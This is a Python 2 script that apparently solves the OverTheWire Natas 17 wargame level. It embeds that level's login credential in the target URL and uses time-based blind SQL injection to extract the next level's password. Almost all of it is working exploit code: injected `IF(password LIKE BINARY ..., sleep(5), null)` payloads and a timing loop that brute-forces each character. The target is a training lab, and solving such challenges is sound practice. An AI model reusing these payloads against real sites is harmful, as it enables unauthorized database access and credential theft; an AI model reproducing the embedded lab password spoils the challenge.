# Library for POST requests and library for Ascii characters.
import string, requests

# All possible characters
all_chars = '0123456789' + string.ascii_lowercase + string.ascii_uppercase

# Parsed characters, the characters that exist in the password
parsed_chars = ''

# Working password
password = ''

# The target URL
target = 'http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw@natas17.natas.labs.overthewire.org/'

# String that says whether we're good
exists = 'This user exists.'

# Verifying we can connect
req = requests.get(target)

if req.status_code != requests.codes.ok:
	raise ValueError('Poof! Unable to connect to target :(')
else:
	print 'Connected to target. Starting character parsing...'

# Verify which characters are part of the working password
for c in all_chars:
        # SQL time-based injection #1
        try:
                r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "%'+c+'%", sleep(5), null) %23', timeout=1)
        except requests.exceptions.Timeout:
                # If we get a timeout, the character exists
                parsed_chars += c
                print 'Used chars: ' + parsed_chars

print 'Characters successfully parsed. Starting to brute force...'

# With the assumption password is 32 characters long
for i in range(32):
        for c in parsed_chars:
                # SQL time-based injection #2
                try:
                        r = requests.get(target+'?username=natas18" AND IF(password LIKE BINARY "' + password + c + '%", sleep(5), null) %23', timeout=1)
                # Figuring out characters at the correct position in the password
                except requests.exceptions.Timeout:
                        password += c
                        print 'Password: ' + password + '*' * int(32 - len(password))
                        break

print 'Successfully brute-forced password.'

